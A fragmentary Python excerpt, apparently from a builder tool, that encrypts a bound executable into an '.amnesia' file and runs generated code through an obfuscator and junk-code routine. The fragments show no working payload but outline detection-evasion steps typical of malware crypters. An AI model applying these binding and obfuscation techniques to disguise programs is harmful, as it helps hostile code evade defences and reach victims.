...
def PrepareEnvironment(settings: dict) -> None:
    if os.path.isfile("bound.exe"):
        ...
        with open("bound.amnesia", "wb") as file:
            file.write(encrypted)
        
    elif os.path.isfile("bound.amnesia"):
        os.remove("bound.amnesia")
...
def main() -> None:
    ...
    obfuscator.AmnesiaX(code, OutCodeFile)
    junk(OutCodeFile)
